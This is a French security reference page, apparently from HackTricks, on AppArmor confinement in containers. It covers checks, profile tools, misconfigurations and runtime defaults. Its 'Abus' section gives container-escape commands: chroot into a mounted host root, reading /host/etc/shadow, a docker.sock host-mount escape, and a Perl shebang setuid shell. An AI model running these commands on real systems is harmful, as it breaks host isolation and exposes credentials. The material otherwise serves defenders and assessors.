# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Aperçu

AppArmor est un système de **Contrôle d'accès obligatoire** qui applique des restrictions via des profils par programme. Contrairement aux vérifications DAC traditionnelles, qui dépendent fortement de la propriété par utilisateur et groupe, AppArmor permet au noyau d'appliquer une politique attachée directement au processus. Dans les environnements containerisés, cela importe parce qu'une workload peut disposer de suffisamment de privilèges traditionnels pour tenter une action et se voir tout de même refuser l'accès parce que son profil AppArmor n'autorise pas le chemin, le montage, le comportement réseau ou l'utilisation de capability concernés.

Le point conceptuel le plus important est qu'AppArmor est **basé sur les chemins**. Il raisonne sur l'accès au système de fichiers via des règles de chemins plutôt que via des labels comme le fait SELinux. Cela le rend accessible et puissant, mais cela signifie aussi que les bind mounts et les agencements alternatifs de chemins méritent une attention particulière. Si le même contenu de l'hôte devient accessible sous un chemin différent, l'effet de la politique peut ne pas être celui auquel l'opérateur s'attendait initialement.

## Rôle dans l'isolation des conteneurs

Les revues de sécurité de conteneurs s'arrêtent souvent aux capabilities et seccomp, mais AppArmor continue d'être pertinent après ces contrôles. Imaginez un conteneur qui a plus de privilèges qu'il ne devrait, ou une workload qui a nécessité une capability supplémentaire pour des raisons opérationnelles. AppArmor peut toujours restreindre l'accès aux fichiers, le comportement de montage, le réseau et les schémas d'exécution d'une manière qui bloque la voie d'abus évidente. C'est pourquoi désactiver AppArmor « just to get the application working » peut silencieusement transformer une configuration simplement risquée en une configuration activement exploitable.

## Laboratoire

Pour vérifier si AppArmor est actif sur l'hôte, utilisez :
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Pour voir sous quel utilisateur s'exécute le processus actuel du conteneur :
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Cette différence est instructive. Dans le cas normal, le processus devrait afficher un contexte AppArmor lié au profil choisi par le runtime. Dans le cas unconfined, cette couche de restriction supplémentaire disparaît.

Vous pouvez aussi inspecter ce que Docker pense avoir appliqué :
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Utilisation à l'exécution

Docker peut appliquer un profil AppArmor par défaut ou personnalisé lorsque l'hôte le supporte. Podman peut aussi s'intégrer à AppArmor sur les systèmes basés sur AppArmor, bien que sur les distributions axées SELinux l'autre système MAC prenne souvent le devant de la scène. Kubernetes peut exposer la politique AppArmor au niveau des workloads sur les nœuds qui prennent effectivement en charge AppArmor. LXC et les environnements de containers système de la famille Ubuntu utilisent également AppArmor de manière intensive.

Le point pratique est qu'AppArmor n'est pas une "fonctionnalité de Docker". C'est une fonctionnalité du noyau de l'hôte que plusieurs runtimes peuvent choisir d'appliquer. Si l'hôte ne le supporte pas ou si le runtime est configuré pour s'exécuter unconfined, la protection supposée n'est pas réellement présente.

Sur des hôtes AppArmor capables de gérer Docker, le profil par défaut le plus connu est `docker-default`. Ce profil est généré à partir du modèle AppArmor de Moby et il est important car il explique pourquoi certains capability-based PoCs échouent encore dans un conteneur par défaut. De manière générale, `docker-default` autorise la mise en réseau ordinaire, refuse les écritures sur une grande partie de `/proc`, refuse l'accès aux parties sensibles de `/sys`, bloque les opérations de mount et restreint ptrace de sorte que ce ne soit pas une primitive générale de sondage de l'hôte. Comprendre cette base permet de distinguer « le conteneur a `CAP_SYS_ADMIN` » de « le conteneur peut réellement utiliser cette capability contre les interfaces du noyau qui m'intéressent ».

## Gestion des profils

Les profils AppArmor sont généralement stockés sous `/etc/apparmor.d/`. Une convention de nommage courante consiste à remplacer les barres obliques du chemin de l'exécutable par des points. Par exemple, un profil pour `/usr/bin/man` est couramment stocké sous `/etc/apparmor.d/usr.bin.man`. Ce détail compte à la fois pour la défense et l'évaluation, car une fois que vous connaissez le nom du profil actif, vous pouvez souvent localiser rapidement le fichier correspondant sur l'hôte.

Les commandes utiles côté hôte incluent :
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La raison pour laquelle ces commandes sont importantes dans une référence container-security est qu'elles expliquent comment les profils sont réellement construits, chargés, basculés en complain mode et modifiés après des changements de l'application. Si un opérateur a pour habitude de passer les profils en complain mode lors du dépannage et oublie de rétablir enforcement, le container peut sembler protégé dans la documentation tout en se comportant beaucoup plus lâchement en réalité.

### Construction et mise à jour des profils

`aa-genprof` peut observer le comportement de l'application et aider à générer un profil de manière interactive :
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` peut générer un modèle de profil qui peut ensuite être chargé avec `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Lorsque le binaire change et que la politique doit être mise à jour, `aa-logprof` peut rejouer les refus trouvés dans les logs et aider l'opérateur à décider s'il faut les autoriser ou les refuser :
```bash
sudo aa-logprof
```
### Journaux

Les refus d'AppArmor sont souvent visibles via `auditd`, syslog, ou des outils tels que `aa-notify` :
```bash
sudo aa-notify -s 1 -v
```
Ceci est utile sur le plan opérationnel et offensif. Les défenseurs l'utilisent pour affiner les profils. Les attaquants l'utilisent pour savoir quel chemin ou quelle opération exacte est refusée et si AppArmor est le contrôle bloquant un exploit chain.

### Identifier le fichier de profil exact

Quand un runtime affiche un nom de profil AppArmor spécifique pour un container, il est souvent utile de faire correspondre ce nom au fichier de profil sur le disque :
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Ceci est particulièrement utile lors de l'examen côté hôte car cela comble le fossé entre "le conteneur indique qu'il s'exécute sous le profil `lowpriv`" et "les règles réelles se trouvent dans ce fichier spécifique qui peut être audité ou rechargé".

## Mauvaises configurations

L'erreur la plus évidente est `apparmor=unconfined`. Les administrateurs le définissent souvent lors du débogage d'une application qui a échoué parce que le profil a correctement bloqué quelque chose de dangereux ou inattendu. Si ce drapeau reste en production, toute la couche MAC est effectivement supprimée.

Un autre problème subtil est de supposer que les bind mounts sont inoffensifs parce que les permissions des fichiers semblent normales. Comme AppArmor est basé sur les chemins, exposer des chemins hôtes sous des points de montage alternatifs peut mal interagir avec les règles de chemin. Une troisième erreur est d'oublier qu'un nom de profil dans un fichier de configuration signifie très peu si le noyau hôte n'applique pas réellement AppArmor.

## Abus

Lorsque AppArmor a disparu, des opérations auparavant contraintes peuvent soudainement fonctionner : lire des chemins sensibles via des bind mounts, accéder à des parties de procfs ou sysfs qui auraient dû rester plus difficiles d'accès, effectuer des actions liées au mount si capabilities/seccomp les autorisent également, ou utiliser des chemins qu'un profil refuserait normalement. AppArmor est souvent le mécanisme qui explique pourquoi une tentative d'évasion basée sur une capability "devrait fonctionner" sur le papier mais échoue encore en pratique. Supprimez AppArmor, et la même tentative peut commencer à réussir.

Si vous suspectez qu'AppArmor est le principal élément qui empêche une chaîne d'abus (parcours de chemins, bind-mount ou actions liées au mount), la première étape consiste généralement à comparer ce qui devient accessible avec et sans profil. Par exemple, si un chemin hôte est monté à l'intérieur du conteneur, commencez par vérifier si vous pouvez le parcourir et le lire :
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Si le conteneur dispose également d'une capacité dangereuse telle que `CAP_SYS_ADMIN`, un des tests les plus pratiques consiste à vérifier si AppArmor est le mécanisme qui empêche les opérations de montage ou l'accès aux systèmes de fichiers sensibles du noyau :
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Dans les environnements où un host path est déjà disponible via un bind mount, la perte d'AppArmor peut aussi transformer un problème de divulgation d'informations en lecture seule en un accès direct aux fichiers de l'hôte :
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Le but de ces commandes n'est pas qu'AppArmor, à lui seul, provoque l'évasion. Il est que, une fois AppArmor retiré, de nombreux vecteurs d'abus basés sur le système de fichiers et les montages deviennent immédiatement testables.

### Exemple complet : AppArmor désactivé + racine de l'hôte montée

Si le conteneur a déjà la racine de l'hôte bind-montée sur `/host`, la suppression d'AppArmor peut transformer un chemin d'abus bloqué lié au système de fichiers en une évasion complète de l'hôte :
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Une fois que le shell s'exécute via le système de fichiers de l'hôte, la charge de travail a effectivement franchi la frontière du conteneur :
```bash
id
hostname
cat /etc/shadow | head
```
### Exemple complet : AppArmor désactivé + Runtime Socket

Si la véritable barrière était AppArmor protégeant l'état runtime, un socket monté peut suffire pour une évasion complète :
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Le chemin exact dépend du point de montage, mais le résultat final est le même : AppArmor n'empêche plus l'accès à l'API d'exécution, et l'API d'exécution peut lancer un container compromettant l'hôte.

### Exemple complet : contournement de bind-mount basé sur le chemin

Parce qu'AppArmor est basé sur les chemins, protéger `/proc/**` ne protège pas automatiquement le même contenu procfs de l'hôte lorsqu'il est accessible via un chemin différent :
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
### Exemple complet : Shebang Bypass

L'impact dépend de ce qui est exactement monté et de savoir si le chemin alternatif contourne également d'autres contrôles, mais ce schéma est l'une des raisons les plus évidentes pour lesquelles AppArmor doit être évalué conjointement avec mount layout plutôt qu'isolément.

La politique AppArmor cible parfois un chemin d'interpréteur d'une manière qui ne tient pas pleinement compte de l'exécution de scripts via la gestion du shebang. Un exemple historique impliquait l'utilisation d'un script dont la première ligne pointe vers un interpréteur confiné :
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ce type d'exemple est important comme rappel que l'intention d'un profil et la sémantique d'exécution réelle peuvent diverger. Lorsqu'on examine AppArmor dans des environnements de conteneurs, les chaînes d'interpréteurs et les chemins d'exécution alternatifs méritent une attention particulière.

## Checks

L'objectif de ces vérifications est de répondre rapidement à trois questions : AppArmor est-il activé sur l'hôte, le processus actuel est-il confiné, et le runtime a-t-il réellement appliqué un profil à ce conteneur ?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Points intéressants :

- Si `/proc/self/attr/current` affiche `unconfined`, la charge de travail ne bénéficie pas du confinement AppArmor.
- Si `aa-status` indique qu'AppArmor est désactivé ou non chargé, tout nom de profil dans la configuration d'exécution est pour l'essentiel cosmétique.
- Si `docker inspect` montre `unconfined` ou un profil personnalisé inattendu, c'est souvent la raison pour laquelle une voie d'abus basée sur le système de fichiers ou les points de montage fonctionne.

Si un conteneur dispose déjà de privilèges élevés pour des raisons opérationnelles, laisser AppArmor activé fait souvent la différence entre une exception contrôlée et une défaillance de sécurité beaucoup plus large.

## Valeurs par défaut du runtime

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissements manuels courants |
| --- | --- | --- | --- |
| Docker Engine | Activé par défaut sur les hôtes compatibles AppArmor | Utilise le profil AppArmor `docker-default` sauf s'il est remplacé | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Dépend de l'hôte | AppArmor est pris en charge via `--security-opt`, mais le comportement par défaut exact dépend de l'hôte/runtime et est moins universel que le profil `docker-default` documenté de Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Par défaut conditionnel | Si `appArmorProfile.type` n'est pas spécifié, la valeur par défaut est `RuntimeDefault`, mais elle n'est appliquée que lorsque AppArmor est activé sur le nœud | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` avec un profil faible, nœuds sans prise en charge AppArmor |
| containerd / CRI-O under Kubernetes | Suit la prise en charge du nœud/runtime | Les runtimes couramment supportés par Kubernetes prennent en charge AppArmor, mais l'application effective dépend toujours du support du nœud et des paramètres de la charge de travail | Identique à la ligne Kubernetes ; la configuration directe du runtime peut aussi désactiver complètement AppArmor |

Pour AppArmor, la variable la plus importante est souvent l'**hôte**, pas seulement le runtime. Une configuration de profil dans un manifeste ne crée pas de confinement sur un nœud où AppArmor n'est pas activé.
